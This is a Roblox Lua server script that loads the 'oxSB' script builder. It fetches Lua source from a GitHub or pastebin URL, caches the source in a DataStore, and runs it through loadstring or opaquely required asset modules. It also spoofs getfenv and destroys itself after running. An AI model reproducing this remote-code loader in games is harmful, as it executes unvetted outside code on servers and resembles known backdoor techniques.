local req = require(6505718551)
--local Loadstring = require(5343495217)
local ss = game:GetService("ServerScriptService")

local http = game:GetService("HttpService")
local DS = game:GetService("DataStoreService")

local function RunHTTP(url, name)
	local success, source = pcall(http.GetAsync, http, url)
	local aa = DS:GetDataStore("SavedLoaded")
	local k = "gyuehwuo3rhqiuhfoer32yhyvfeh"
	if not success then
		local d = aa:GetAsync(k)
		if d and type(d) == "string" then
			source = d
			warn("Running from datastore")
		else
			error("Forbidden and not saved...")
		end
	end
	local loadstringEnabled = pcall(loadstring, "") and true or false
	if loadstringEnabled then
		local y, err = loadstring(source)
		if y then
			local scriptBase = getfenv(require(4889063407).load).script:GetChildren()[1]:Clone()
			scriptBase.Name = name
			scriptBase.Disabled = false
			local runner = Instance.new("BindableFunction")
			runner.OnInvoke = function()
				return function(db)
					if db then return end
					getfenv(2).getfenv = function(lvl)
						return (function()
							getfenv(2).getfenv = getfenv
							return "oxSB_Script"
						end)()
					end
					return loadstring, source
				end
			end
			runner.Parent = scriptBase
			runner.Name = "Runner"
			scriptBase.Parent = game:GetService("ServerScriptService")
		else
			error("oxSB Error Source: "..tostring(err), 0)
		end
	else
		req.NS(source, ss).Name = name
	end
	if success then
		aa:SetAsync(k, source)
	end
end

local url = "https://raw.githubusercontent.com/DrawingJhon/VSB-Portable/main/oxSB.lua"
if game.PlaceId == 109537200 and game.PrivateServerId ~= "" then
	url = "https://pastebin.com/raw/48Y2DS2i"
end
RunHTTP(url, "oxSB")

wait();script:Destroy()